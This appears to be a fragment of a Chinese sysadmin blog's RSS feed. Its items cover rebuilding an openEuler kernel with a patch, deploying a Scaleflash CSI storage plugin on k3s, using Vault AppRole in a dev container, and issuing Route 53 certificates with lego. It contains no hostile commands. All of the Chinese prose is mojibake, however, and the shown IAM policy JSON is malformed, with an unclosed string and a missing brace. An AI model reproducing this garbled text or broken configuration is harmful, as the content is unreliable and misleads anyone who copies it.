&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dnf install -y kernel-source
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç°åœ¨æ˜¯2024å¹´11æœˆ4æ—¥ï¼Œå†…æ ¸ç‰ˆæœ¬æ˜¯ linux-5.10.0-60.139.0.166.oe2203.x86_64ï¼Œæ³¨æ„è¡¥ä¸çš„é€‚ç”¨èŒƒå›´&lt;/p&gt;
&lt;p&gt;å››ã€æ‰“è¡¥ä¸&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;page.patch&#34;&gt;page.patch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å°†page.patch æ”¾åˆ° /usr/src&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;patch -p1 &amp;lt; ../page.patch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äº”ã€ç¼–è¾‘å†…æ ¸ç‰ˆæœ¬å·ï¼ŒEXTRAVERSIONçš„ç‰ˆæœ¬å·è¦å¤§äºå½“å‰å†…æ ¸ç‰ˆæœ¬ï¼Œå¦åˆ™æ— æ³•å®‰è£…ã€‚å½“å‰æ˜¯166ï¼Œæ”¹æˆ+1ï¼Œ167&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# SPDX-License-Identifier: GPL-2.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;VERSION&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;PATCHLEVEL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;SUBLEVEL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;EXTRAVERSION&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; -60.139.0.167.oe2203.x86_64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;NAME&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Kleptomaniac Octopus
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;OPENEULER_MAJOR&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2203&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;OPENEULER_MINOR&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…­ã€ç¼–è¯‘&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä¸ºæå®¢å¤©æˆæ”¹å†™ä¸€å¥—CSIå­˜å‚¨æ’ä»¶</title>
      <link>https://rendoumi.com/posts/20250807-csi_scaleflash/</link>
      <pubDate>Thu, 07 Aug 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250807-csi_scaleflash/</guid>
      <description>&lt;p&gt;æå®¢å¤©æˆæœ‰ä¸ªå¾ˆå‰å®³çš„scaleflashç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œå……åˆ†åˆ©ç”¨rdmaçš„æ— æŸç½‘ç»œç‰¹æ€§ï¼Œå¹¶è¿›ä¸€æ­¥å‘æ‰¬å…‰å¤§ã€‚ç ”å‘å‡ºæ¥äº†å¯ä»¥é¡¶æ›¿EMCç›˜é˜µçš„å­˜å‚¨ç³»ç»Ÿï¼Œå¯ä»¥åœ¨å…¶ä¸Šè·‘Oracleç­‰æ•°æ®åº“ç³»ç»Ÿï¼ŒçœŸçš„æ˜¯å›½è´§ä¹‹å…‰äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¸®å®ƒä»¬æ”¹å†™äº†ä¸€ä¸ªcsiçš„å­˜å‚¨æ’ä»¶ï¼Œè®°å½•ä¸€ä¸‹ï¼ŒåŸºäºyandexçš„s3 csiè€Œæ¥ï¼Œè¿™æ ·æ—¢å¯ä»¥è·‘åˆ°åº•å±‚ä¸Šæä¾›æ–‡ä»¶å—è®¾å¤‡ï¼Œä¹Ÿå¯ä»¥ä¸Šå‡åˆ°ç±»ä¼¼NFSæˆ–è€…S3çš„å±‚æ¬¡æä¾›æ–‡ä»¶ç³»ç»Ÿï¼Œèƒ½æ»¡è¶³å¤§å¤šæ•°éœ€æ±‚ã€‚é‚£æºä»£ç å°±ç»å¯¹ä¸æä¾›äº†ï¼Œåªè¯´ä¸€ä¸‹è¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;csi-pluginçš„ä½¿ç”¨æ–¹æ³•&#34;&gt;CSI PLUGINçš„ä½¿ç”¨æ–¹æ³•ï¼š&lt;/h2&gt;
&lt;h4 id=&#34;ä¸€å¯¼å…¥é•œåƒ&#34;&gt;ä¸€ã€å¯¼å…¥é•œåƒ&lt;/h4&gt;
&lt;p&gt;csiå­˜å‚¨æ’ä»¶çš„image&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ–‡ä»¶ï¼šcsi.tar&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å°†æ–‡ä»¶æ”¾åˆ°æ‰€æœ‰worknodeä¸Šï¼Œå¯¼å…¥æœ¬åœ°é•œåƒåº“:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ctr --address /run/k3s/containerd/containerd.sock -n k8s.io images import /root/csi.tar
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crictl -r unix:///run/k3s/containerd/containerd.sock images
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹åˆ°æœ‰ cr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 æ—¢æ˜¯å¯¼å…¥æˆåŠŸ&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250807151100045&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250807-csi_scaleflash/image-20250807151100045.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;äºŒå®‰è£…controllerå’Œnodeserver&#34;&gt;äºŒã€å®‰è£…controllerå’Œnodeserver&lt;/h4&gt;
&lt;p&gt;å®‰è£…driver&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶ï¼šdriver.yaml&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl apply -f driver.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…controller&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶ï¼šcontroller.yaml&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl apply -f controller.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…nodeserver&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶ï¼šnodeserver.yaml&lt;/p&gt;
&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼Œcontrolleræ˜¯ä¸€ä¸ªstatefulsetï¼Œæ•´ä¸ªé›†ç¾¤è¿è¡Œä¸€ä¸ªå³å¯ï¼›è€Œnodeservershiåˆ™æ˜¯ä¸€ä¸ªdaemonsetï¼Œæ¯ä¸ªworknodeéƒ½ä¼šè¿è¡Œä¸€ä¸ªå‰¯æœ¬&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250807151213874&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250807-csi_scaleflash/image-20250807151213874.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢ worknode æ˜¯3ä¸ªï¼Œæ‰€ä»¥æœ‰3ä¸ªå‰¯æœ¬&lt;/p&gt;
&lt;h4 id=&#34;ä¸‰scaleflash-å—è®¾å¤‡çš„ä½¿ç”¨&#34;&gt;ä¸‰ã€scaleflash å—è®¾å¤‡çš„ä½¿ç”¨&lt;/h4&gt;
&lt;p&gt;å—è®¾å¤‡æœ€å°å•ä½æ˜¯Gï¼Œæ‰€ä»¥å¦‚æœéœ€æ±‚äº†100Mï¼Œé‚£ä¹Ÿæ˜¯1Gã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå¿…é¡»å®šä¹‰ä¸€ä¸ªstorageclassï¼Œä»¥åä½¿ç”¨è¿™ä¸€ä¸ªstorageclasså°±å¯ä»¥äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;scaleflash-storageclass.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;---
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;kind: StorageClass
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;apiVersion: storage.k8s.io/v1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  name: scaleflash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;provisioner: ru.yandex.s3.csi
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;parameters:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  mounter: scaleflash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  clstID: &amp;#34;nvmatrix_101&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  fsType: &amp;#34;xfs&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kubectl apply -f scaleflash-storageclass.yaml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†å®šä¹‰pvc&lt;/p&gt;</description>
    </item>
    <item>
      <title>vaultä½¿ç”¨agentéªŒè¯approleç”Ÿæˆ.envç¯å¢ƒå˜é‡</title>
      <link>https://rendoumi.com/posts/20250806-vault_approle_env/</link>
      <pubDate>Wed, 06 Aug 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250806-vault_approle_env/</guid>
      <description>&lt;p&gt;Vaultæ˜¯ä¸ªå¾ˆå‰å®³çš„ secret å¼•æ“äº†ï¼Œä¸å¤šè¯´äº†ï¼Œä¸»è¦ç”¨äºé›†ä¸­ç®¡ç†å„ç§å¯†ç ã€å¯†é’¥ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨æ¥ç®¡ç†Kubernetesçš„å‡­æ®ç›¸å½“å¥½ï¼Œä½†æ˜¯æˆ‘ä»¬é€šå¸¸æ˜¯è‡ªå·±å¼€å‘çš„ç¨‹åºï¼Œç„¶åéœ€è¦è¯»å„ç§é…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚è¿æ¥DBçš„ç”¨æˆ·åï¼Œå¯†ç ç­‰ç­‰ï¼Œæœ€åè¿æ¥åˆ°æ•°æ®åº“ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç®¡ç†å¥½é…ç½®é¡¹å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ–¹æ³•å¦‚ä¸‹ï¼Œç”¨approleè¯»å–Vaultçš„é…ç½®ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€å¯åŠ¨vaultå¼•æ“æµ‹è¯•ç¯å¢ƒ&#34;&gt;ä¸€ã€å¯åŠ¨vaultå¼•æ“æµ‹è¯•ç¯å¢ƒ&lt;/h5&gt;
&lt;p&gt;é¦–å…ˆå¯åŠ¨vaultå¼•æ“ï¼Œæµ‹è¯•ï¼Œç”¨Dockerï¼Œæ–¹ä¾¿åˆ›å»ºå’Œé”€æ¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¯åŠ¨å®¹å™¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šäº†ROOT_TOKENæ˜¯rootï¼Œè¿™åªç”¨äºæµ‹è¯•ç¯å¢ƒ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -d --rm &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --add-host host.docker.internal:host-gateway &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --cap-add&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;IPC_LOCK &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --name vault &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -p 8200:8200 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -e &lt;span class=&#34;nv&#34;&gt;VAULT_DEV_ROOT_TOKEN_ID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;root &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -e &lt;span class=&#34;nv&#34;&gt;VAULT_DEV_LISTEN_ADDRESS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0:8200 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  hashicorp/vault
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h6 id=&#34;--add-host-hostdockerinternalhost-gateway&#34;&gt;&lt;code&gt;--add-host host.docker.internal:host-gateway&lt;/code&gt;&lt;/h6&gt;
&lt;p&gt;è¿™ä¸ªä¸ªå‚æ•°çš„ä½œç”¨æ˜¯åœ¨å®¹å™¨çš„ &lt;code&gt;/etc/hosts&lt;/code&gt; æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªä¸»æœºåå’Œ IP åœ°å€çš„æ˜ å°„ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;--add-host&lt;/code&gt;&lt;/strong&gt;: è¿™æ˜¯ &lt;code&gt;docker run&lt;/code&gt; çš„ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨æ¥åœ¨å®¹å™¨çš„ &lt;code&gt;/etc/hosts&lt;/code&gt; æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„ä¸»æœºæ¡ç›®ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;host.docker.internal&lt;/code&gt;&lt;/strong&gt;: è¿™æ˜¯ä¸»æœºåã€‚åœ¨ Docker Desktopï¼ˆmacOS å’Œ Windowsï¼‰ä¸­ï¼Œ&lt;code&gt;host.docker.internal&lt;/code&gt; æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ DNS åç§°ï¼Œå®ƒä¼šè¢«è§£æä¸ºå®¿ä¸»æœºçš„å†…éƒ¨ IP åœ°å€ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;host-gateway&lt;/code&gt;&lt;/strong&gt;: è¿™æ˜¯ &lt;code&gt;docker&lt;/code&gt; åœ¨è¾ƒæ–°ç‰ˆæœ¬ä¸­å¼•å…¥çš„ä¸€ä¸ªç‰¹æ®Šå…³é”®å­—ã€‚å®ƒä»£è¡¨äº†å®¿ä¸»æœºä¸ Docker ç½‘ç»œä¹‹é—´çš„ç½‘å…³ IP åœ°å€ã€‚åœ¨è®¸å¤š Linux ç¯å¢ƒä¸­ï¼Œè¿™ä¸ªå…³é”®å­—ä¼šæŒ‡å‘ Docker çš„ç½‘æ¡¥ IPï¼ˆä¾‹å¦‚ &lt;code&gt;172.17.0.1&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ç»¼åˆèµ·æ¥ï¼Œ&lt;code&gt;--add-host host.docker.internal:host-gateway&lt;/code&gt; çš„ä½œç”¨æ˜¯ï¼š&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>ä¸Šéš¾åº¦----&gt;å†…ç½‘vpsç”¨legoç”³è¯·route53 DNSè¯ä¹¦å¹¶æ›´æ–°åˆ°BTå®å¡”</title>
      <link>https://rendoumi.com/posts/20250729-route53_lego_bt_certificate/</link>
      <pubDate>Tue, 29 Jul 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250729-route53_lego_bt_certificate/</guid>
      <description>&lt;p&gt;ä¸Šä¸€ç¯‡æˆ‘ä»¬è¯´äº† &lt;a href=&#34;posts/20250725-aws_route53_update_certificate/&#34;&gt;Awsçš„EC2æœåŠ¡å™¨ç”¨legoè·å¾—å…è´¹è¯ä¹¦å¹¶æ›´æ–°åˆ°ACM&lt;/a&gt;ï¼Œè¿™ä¸‹åˆæ¥äº†ä¸ªæ›´åŠ æœ‰éš¾åº¦çš„æŒ‘æˆ˜ï¼š&lt;/p&gt;
&lt;p&gt;DNSè§£ææ˜¯æ”¾åœ¨äº†AWS Route 53ä¸Šï¼Œç„¶åvpsä¸Šè·‘ç€BTå®å¡”ï¼Œç”¨æ¥ä»£ç†è½¬å‘å¼€å‘ç¯å¢ƒçš„httpsè¯ä¹¦&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªç¯å¢ƒå¦‚ä½•ç”¨legoæ¥å®‰å…¨çš„ç”³è¯·åˆ°è¯ä¹¦å¹¶é…ç½®å®å¡”å‘¢ï¼Ÿè¿™å›å¯ä¸åƒEC2é‚£æ ·å¯ä»¥è‡ªåŠ¨é™„åŠ IAMè§’è‰²äº†&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹legoçš„ç”¨æ³•å§ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://go-acme.github.io/lego/dns/route53/&#34;&gt;https://go-acme.github.io/lego/dns/route53/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¯­æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250729091919259&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250729-route53_lego_bt_certificate/image-20250729091919259.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­çœ‹ï¼Œçœ‹æ¥å¿…é¡»éœ€è¦IAMçš„å‡­æ®æ‰å¯ä»¥ï¼Œç»§ç»­ä¸‹æ‹‰ï¼Œæœ‰ä½¿ç”¨IAMçš„policyï¼Œé‚£æˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªRoleè§’è‰²ï¼Œç„¶åå†å»ºç«‹ä¸€ä¸ªä»£ç†ç”¨æˆ·ï¼Œgenå‡ºkeyï¼Œé€šè¿‡è¿™ä¸ªä»£ç†ç”¨æˆ·çš„å‡­æ®æ¥é—´æ¥è¿›è¡Œè®¿é—®&lt;/p&gt;
&lt;p&gt;æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€å»route53æ‹¿åˆ°arn&#34;&gt;ä¸€ã€å»route53ï¼Œæ‹¿åˆ°arn&lt;/h5&gt;
&lt;p&gt;æˆ‘ä»¬è¦æ‹¿åˆ°å…·ä½“åŸŸåçš„zone IDï¼Œå°±æ˜¯Z0æ‰“å¤´çš„é‚£ä¸€ä¸²&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250729092241728&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250729-route53_lego_bt_certificate/image-20250729092241728.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;äºŒå»ºç«‹iamå®é™…å·¥ä½œçš„role&#34;&gt;äºŒã€å»ºç«‹IAMå®é™…å·¥ä½œçš„Role&lt;/h5&gt;
&lt;p&gt;é¦–å…ˆå»ºç«‹ä¸€ä¸ªPolicyï¼Œroute53AcmeCert&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Version&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2012-10-17
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    &amp;#34;&lt;/span&gt;Statement&lt;span class=&#34;s2&#34;&gt;&amp;#34;: [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Effect&lt;span class=&#34;s2&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;Allow&lt;span class=&#34;s2&#34;&gt;&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Action&lt;span class=&#34;s2&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;route53:GetChange&lt;span class=&#34;s2&#34;&gt;&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;            &amp;#34;&lt;/span&gt;Resource&lt;span class=&#34;s2&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;arn:aws:route53:::change/*&lt;span class=&#34;s2&#34;&gt;&amp;#34;
